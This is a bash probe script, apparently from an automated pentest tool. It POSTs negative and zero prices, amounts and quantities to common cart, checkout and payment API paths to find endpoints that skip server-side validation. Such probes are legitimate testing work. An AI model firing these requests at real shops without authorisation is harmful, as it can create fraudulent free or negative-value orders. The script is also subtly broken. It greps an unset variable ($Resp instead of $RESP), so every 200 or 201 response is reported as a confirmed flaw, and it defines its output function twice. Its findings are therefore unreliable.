#!/usr/bin/env bash
# ============================================================================
# SentinelAI Autonomous Pentest Platform — Security PoC Probe
# Name:        Price/Amount Manipulation Probe
# Description: Tests for negative, zero, and float amounts in API parameters
# Severity:    HIGH
# Category:    Broken Access Control & Authentication
# Language:    bash
# ============================================================================

# Target argument handling: allow positional arg $1 or env var TARGET
TARGET="${1:-${TARGET:-}}"
SCAN_ID="${SCAN_ID:-standalone_poc_test}"
DEPTH="${DEPTH:-standard}"

if [ -z "$TARGET" ]; then
  echo -e "\033[1;31m[-] Error: Missing TARGET argument.\033[0m"
  echo -e "\033[1;33m[*] Usage:   $0 <target_url_or_ip>\033[0m"
  echo -e "\033[1;34m[*] Example: $0 https://example.com\033[0m"
  exit 1
fi

# Normalize URL: remove trailing slash
TARGET="${TARGET%/}"

echo -e "\033[1;36m[*] [SentinelAI PoC] Running probe: Price/Amount Manipulation Probe\033[0m"
echo -e "\033[1;34m[*] Target: $TARGET\033[0m"
echo ""

# Standard emit handler for standalone terminal execution
emit() {
  echo -e "\033[1;32m[+] VULNERABILITY CONFIRMED / FINDING EMITTED:\033[0m"
  echo "$1" | python3 -m json.tool 2>/dev/null || echo "    $1"
}

# --- Core PoC Execution ---
emit() { printf '%s\n' "$1"; }
T="$TARGET"
# find API endpoints that accept amounts
PATHS="api/cart api/order api/v1/order api/checkout api/v1/checkout api/payment api/v1/payment api/subscribe api/v1/subscribe api/buy api/v1/buy"
for P in $PATHS; do
  # negative amount
  R=$(curl -s -o /dev/null -w "%{http_code}" -X POST -H "Content-Type: application/json" -d '{"amount":-1,"price":-100,"quantity":-1}' --max-time 10 "$T/$P" 2>/dev/null)
  if [ "$R" = "200" ] || [ "$R" = "201" ]; then
    RESP=$(curl -s -X POST -H "Content-Type: application/json" -d '{"amount":-1,"price":-100,"quantity":-1}' --max-time 10 "$T/$P" 2>/dev/null | head -c 500)
    if ! echo "$Resp" | grep -qi "error\|invalid\|negative"; then
      emit "{\"title\":\"Negative amount accepted: /$P\",\"severity\":\"high\",\"description\":\"API endpoint /$P accepts negative amounts without validation. May enable refunds exploitation or balance manipulation.\",\"remediation\":\"Validate all amounts as positive decimals with server-side bounds.\",\"cweId\":\"CWE-20\",\"owaspCategory\":\"A04:2025-Insecure Design\"}"
    fi
  fi
  # zero amount
  R=$(curl -s -o /dev/null -w "%{http_code}" -X POST -H "Content-Type: application/json" -d '{"amount":0,"price":0}' --max-time 10 "$T/$P" 2>/dev/null)
  if [ "$R" = "200" ] || [ "$R" = "201" ]; then
    emit "{\"title\":\"Zero amount accepted: /$P\",\"severity\":\"medium\",\"description\":\"API endpoint /$P accepts zero amounts. Free orders possible if checkout completes.\",\"remediation\":\"Enforce minimum amount validation server-side.\",\"cweId\":\"CWE-20\",\"owaspCategory\":\"A04:2025-Insecure Design\"}"
  fi
done

echo ""
echo -e "\033[1;34m[*] Probe execution complete.\033[0m"
